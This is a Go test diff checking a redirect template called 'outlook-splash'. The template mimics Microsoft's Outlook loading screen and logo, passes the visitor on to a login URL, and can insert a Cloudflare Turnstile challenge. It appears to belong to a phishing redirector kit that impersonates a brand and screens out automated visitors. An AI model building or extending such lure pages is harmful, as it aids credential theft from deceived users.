@@ -193,3 +193,55 @@ func TestServeRedirectPage(t *testing.T) {
 		t.Errorf("expected a noscript meta-refresh fallback")
 	}
 }
+
+// the Outlook splash must be self-contained (no image for the mark), keep the
+// look, resolve every placeholder and expose a Turnstile slot.
+func TestOutlookSplashTemplate(t *testing.T) {
+	meta, html, err := GetRedirectTemplate("outlook-splash")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if meta.Category == "" || meta.Logo == "" || meta.Delay <= 0 {
+		t.Errorf("meta incomplete: %+v", meta)
+	}
+	if !meta.HasSlot {
+		t.Error("outlook-splash must expose a Turnstile slot")
+	}
+	// the mark is drawn with divs/gradients, the only image is the Microsoft mark
+	for _, want := range []string{
+		"pinchAndRelease", "documentOneScale", "documentTwoScale", "layersSlideIn",
+		`id="loadingScreen"`, `id="container"`, `id="MSLogo"`,
+		"res.public.onecdn.static.microsoft/", `id="__ts_slot__"`,
+	} {
+		if !strings.Contains(html, want) {
+			t.Errorf("splash missing %q", want)
+		}
+	}
+
+	out := applyTemplateVars(html, &RedirectPage{Template: "outlook-splash"})
+	out = strings.ReplaceAll(out, "__DESTINATION__", "https://login.example.com/auth/login")
+	out = strings.ReplaceAll(out, "__DELAY__", "3")
+	for _, ph := range []string{"__TITLE__", "__SUBTITLE__", "__BRAND__", "__BUTTON__", "__ACCENT__", "__LOGO__", "__MSGS__", "__DESTINATION__", "__DELAY__"} {
+		if strings.Contains(out, ph) {
+			t.Errorf("placeholder %s left unreplaced", ph)
+		}
+	}
+	for _, want := range []string{"__tsGo", "__tsPending", "window.location.replace"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("redirect/turnstile hand-off missing %q", want)
+		}
+	}
+
+	// the slot vanishes when Turnstile is off, fills in place when on
+	off := injectTurnstile(out, &RedirectPage{Template: "outlook-splash"}, "", false)
+	if strings.Contains(off, `id="__ts_slot__"`) {
+		t.Error("slot should be removed when turnstile is off")
+	}
+	on := injectTurnstile(out, &RedirectPage{Template: "outlook-splash"}, "SITEKEY", true)
+	if strings.Contains(on, `id="__ts_slot__"`) {
+		t.Error("slot should be replaced when turnstile is on")
+	}
+	if !strings.Contains(on, "cf-turnstile") || !strings.Contains(on, "SITEKEY") {
+		t.Error("turnstile widget not injected")
+	}
+}
